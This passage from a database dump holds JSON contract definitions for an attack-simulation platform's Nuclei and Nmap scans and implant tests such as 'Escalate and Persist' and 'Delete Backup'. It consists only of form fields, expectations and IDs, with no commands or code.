"Expectations", "type": "expectation", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": [], "predefinedExpectations": [{"expectation_type": "VULNERABILITY", "expectation_name": "Not vulnerable", "expectation_description": "", "expectation_score": 100, "expectation_expectation_group": false}]}, {"key": "template", "label": "Manual template path (-t)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}], "outputs": [{"type": "cve", "field": "cve", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}, {"type": "text", "field": "others", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}], "config": {"type": "openaev_nuclei", "expose": true, "label": {"en": "Nuclei Scan", "fr": "Nuclei Scan"}, "color_dark": "#ff5722", "color_light": "#ff5722"}, "manual": false, "variables": [{"key": "user", "label": "User that will receive the injection", "type": "String", "cardinality": "1", "children": [{"key": "user.id", "label": "Id of the user in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "user.email", "label": "Email of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.firstname", "label": "Firstname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lastname", "label": "Lastname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lang", "label": "Lang of the user", "type": "String", "cardinality": "1", "children": []}]}, {"key": "exercise", "label": "Exercise of the current injection", "type": "Object", "cardinality": "1", "children": [{"key": "exercise.id", "label": "Id of the exercise in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.name", "label": "Name of the exercise", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.description", "label": "Description of the exercise", "type": "String", "cardinality": "1", "children": []}]}, {"key": "teams", "label": "List of team name for the injection", "type": "String", "cardinality": "n", "children": []}, {"key": "player_uri", "label": "Player interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "challenges_uri", "label": "Challenges interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "scoreboard_uri", "label": "Scoreboard interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "lessons_uri", "label": "Lessons learned interface platform link", "type": "String", "cardinality": "1", "children": []}], "contract_attack_patterns_external_ids": [], "contract_vulnerability_external_ids": [], "is_atomic_testing": true, "platforms": [], "external_id": null}	e1bad898-9804-427d-99e4-dc32c5f2898d	t	f	{}	f	\N	f	\N
b0a5f542-34b2-46a5-8376-472f65cbb494	2026-01-09 14:53:06.83623+00	2026-01-09 14:53:06.836236+00	"en"=>"Test - Scan Server", "fr"=>"Test - Scan Server"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Scan Server","en":"Test - Scan Server"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"b0a5f542-34b2-46a5-8376-472f65cbb494","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	1f745401-a2bf-44ec-a609-6030d3a153a2	f	\N
9468489c-8362-45f4-8555-b7b832802789	2026-01-09 14:57:19.126034+00	2026-01-09 14:57:19.12604+00	"en"=>"Test - Change Wallpaper", "fr"=>"Test - Change Wallpaper"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Change Wallpaper","en":"Test - Change Wallpaper"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"9468489c-8362-45f4-8555-b7b832802789","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	82f6e11c-e97d-45bf-9c2a-9bc535cf2745	f	\N
c0aea56f-28f4-498e-ace0-38afcfe54c62	2026-01-09 15:01:28.78537+00	2026-01-09 15:01:28.785378+00	"en"=>"Test - Escalate and Persist", "fr"=>"Test - Escalate and Persist"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Escalate and Persist","en":"Test - Escalate and Persist"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"c0aea56f-28f4-498e-ace0-38afcfe54c62","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	cc662372-8709-4b0e-bcad-def543868809	f	\N
2e7fc079-4444-4531-4444-928fe4a1fc0b	2026-01-09 14:19:36.681171+00	2026-01-16 10:18:33.258244+00	"en"=>"Nuclei - CVE Scan", "fr"=>"Nuclei - Scan CVE"	f	{"contract_id": "2e7fc079-4444-4531-4444-928fe4a1fc0b", "label": {"en": "Nuclei - CVE Scan", "fr": "Nuclei - Scan CVE"}, "fields": [{"key": "target_selector", "label": "Type of targets", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": true, "readOnly": false, "cardinality": "1", "defaultValue": ["asset-groups"], "choices": {"assets": "Assets", "manual": "Manual", "asset-groups": "Asset groups"}}, {"key": "assets", "label": "Targeted assets", "type": "asset", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "assets"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "assets"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "asset_groups", "label": "Targeted asset groups", "type": "asset-group", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "asset-groups"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "asset-groups"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "target_property_selector", "label": "Targeted assets property", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": ["assets", "asset-groups"]}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": ["assets", "asset-groups"]}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ["automatic"], "choices": {"automatic": "Automatic", "hostname": "Hostname", "seen_ip": "Seen IP", "local_ip": "Local IP (first)"}}, {"key": "targets", "label": "Manual targets (comma-separated)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "manual"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "manual"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}, {"key": "expectations", "label": "Expectations", "type": "expectation", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": [], "predefinedExpectations": [{"expectation_type": "VULNERABILITY", "expectation_name": "Not vulnerable", "expectation_description": "", "expectation_score": 100, "expectation_expectation_group": false}]}, {"key": "template", "label": "Manual template path (-t)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}], "outputs": [{"type": "cve", "field": "cve", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}, {"type": "text", "field": "others", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}], "config": {"type": "openaev_nuclei", "expose": true, "label": {"en": "Nuclei Scan", "fr": "Nuclei Scan"}, "color_dark": "#ff5722", "color_light": "#ff5722"}, "manual": false, "variables": [{"key": "user", "label": "User that will receive the injection", "type": "String", "cardinality": "1", "children": [{"key": "user.id", "label": "Id of the user in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "user.email", "label": "Email of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.firstname", "label": "Firstname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lastname", "label": "Lastname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lang", "label": "Lang of the user", "type": "String", "cardinality": "1", "children": []}]}, {"key": "exercise", "label": "Exercise of the current injection", "type": "Object", "cardinality": "1", "children": [{"key": "exercise.id", "label": "Id of the exercise in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.name", "label": "Name of the exercise", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.description", "label": "Description of the exercise", "type": "String", "cardinality": "1", "children": []}]}, {"key": "teams", "label": "List of team name for the injection", "type": "String", "cardinality": "n", "children": []}, {"key": "player_uri", "label": "Player interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "challenges_uri", "label": "Challenges interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "scoreboard_uri", "label": "Scoreboard interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "lessons_uri", "label": "Lessons learned interface platform link", "type": "String", "cardinality": "1", "children": []}], "contract_attack_patterns_external_ids": [], "contract_vulnerability_external_ids": [], "is_atomic_testing": true, "platforms": [], "external_id": null}	e1bad898-9804-427d-99e4-dc32c5f2898d	t	f	{}	f	\N	f	\N
ca8102b1-86fe-4518-b519-8162b82692dd	2026-01-09 14:59:59.05715+00	2026-01-09 14:59:59.057157+00	"en"=>"Test - Delete Backup", "fr"=>"Test - Delete Backup"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Delete Backup","en":"Test - Delete Backup"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"ca8102b1-86fe-4518-b519-8162b82692dd","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	f5cb168c-32e5-4089-aaa9-e57c45ef28b4	f	\N
6f4d7e18-c730-484a-bb09-c9c321820c0a	2026-01-09 14:19:37.000087+00	2026-01-16 10:18:19.750171+00	"en"=>"Nmap - FIN Scan", "fr"=>"Nmap - FIN Scan"	f	{"contract_id": "6f4d7e18-c730-484a-bb09-c9c321820c0a", "label": {"en": "Nmap - FIN Scan", "fr": "Nmap - FIN Scan"}, "fields": [{"key": "target_selector", "label": "Type of targets", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": true, "readOnly": false, "cardinality": "1", "defaultValue": ["asset-groups"], "choices": {"assets": "Assets", "manual": "Manual", "asset-groups": "Asset groups"}}, {"key": "assets", "label": "Targeted assets", "type": "asset", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "assets"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "assets"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "asset_groups", "label": "Targeted asset groups", "type": "asset-group", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "asset-groups"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "asset-groups"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "target_property_selector", "label": "Targeted assets property", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": ["assets", "asset-groups"]}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": ["assets", "asset-groups"]}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ["automatic"], "choices": {"automatic": "Automatic", "hostname": "Hostname", "seen_ip": "Seen IP", "local_ip": "Local IP (first)"}}, {"key": "targets", "label": "Manual targets (comma-separated)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "manual"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "manual"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}, {"key": "expectations", "label": "Expectations", "type": "expectation", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": [], "predefinedExpectations": [{"expectation_type": "DETECTION", "expectation_name": "Detection", "expectation_description": "", "expectation_score": 100, "expectation_expectation_group": false}]}], "outputs": [{"type": "portscan", "field": "scan_results", "labels": ["scan"], "isFindingCompatible": true, "isMultiple": true}, {"type": "port", "field": "ports", "labels": ["scan"], "isFindingCompatible": false, "isMultiple": true}], "config": {"type": "openaev_nmap", "expose": true, "label": {"en": "Nmap Scan", "fr": "Nmap Scan"}, "color_dark": "#00bcd4", "color_light": "#00bcd4"}, "manual": false, "variables": [{"key": "user", "label": "User that will receive the injection", "type": "String", "cardinality": "1", "children": [{"key": "user.id", "label": "Id of the user in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "user.email", "label": "Email of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.firstname", "label": "Firstname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lastname", "label": "Lastname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lang", "label": "Lang of the user", "type": "String", "cardinality": "1", "children": []}]}, {"key": "exercise", "label": "Exercise of the current injection", "type": "Object", "cardinality": "1", "children": [{"key": "exercise.id", "label": "Id of the exercise in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.name", "label": "Name of the exercise", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.description", "label": "Description of the exercise", "type": "String", "cardinality": "1", "children": []}]}, {"key": "teams", "label": "List of team name for the injection", "type": "String", "cardinality": "n", "children": []}, {"key": "player_uri", "label": "Player interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "challenges_uri", "label": "Challenges interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "scoreboard_uri", "label": "Scoreboard interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "lessons_uri", "label": "Lessons learned interface platform link", "type": "String", "cardinality": "1", "children": []}], "contract_attack_patterns_external_ids": [], "contract_vulnerability_external_ids": [], "is_atomic_testing": true, "platforms": [], "external_id": null}	76f8f4d6-9f6f-4e61-befc-48f735876a4a	t	f	{}	f	\N	f	\N
3cf1b7a6-39d2-4531-8c8e-2b7c67470d1e	2026-01-09 14:19:36.68122+00	2026-01-16 10:18:33.258651+00	"en"=>"Nuclei - Panel Scan", "fr"=>"Nuclei - Scan Panel"	f	{"contract_id": "3cf1b7a6-39d2-4531-8c8e-2b7c67470d1e", "label": {"en": "Nuclei - Panel Scan", "fr": "Nuclei - Scan Panel"}, "fields": [{"key": "target_selector", "label": "Type of targets", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": true, "readOnly": false, "cardinality": "1", "defaultValue": ["asset-groups"], "choices": {"assets": "Assets", "manual": "Manual", "asset-groups": "Asset groups"}}, {"key": "assets", "label": "Targeted assets", "type": "asset", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "assets"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "assets"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "asset_groups", "label": "Targeted asset groups", "type": "asset-group", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "asset-groups"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "asset-groups"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "target_property_selector", "label": "Targeted assets property", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": ["assets", "asset-groups"]}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": ["assets", "asset-groups"]}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ["automatic"], "choices": {"automatic": "Automatic", "hostname": "Hostname", "seen_ip": "Seen IP", "local_ip": "Local IP (first)"}}, {"key": "targets", "label": "Manual targets (comma-separated)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "manual"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "manual"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}, {"key": "expectations", "label": "Expectations", "type": "expectation", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": [], "predefinedExpectations": [{"expectation_type": "VULNERABILITY", "expectation_name": "Not vulnerable", "expectation_description": "", "expectation_score": 100, "expectation_expectation_group": false}]}, {"key": "template", "label": "Manual template path (-t)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}], "outputs": [{"type": "cve", "field": "cve", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}, {"type": "text", "field": "others", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}], "config": {"type": "openaev_nuclei", "expose": true, "label": {"en": "Nuclei Scan", "fr": "Nuclei Scan"}, "color_dark": "#ff5722", "color_light": "#ff5722"}, "manual": false, "variables": [{"key": "user", "label": "User that will receive the injection", "type": "String", "cardinality": "1", "children": [{"key": "user.id", "label": "Id 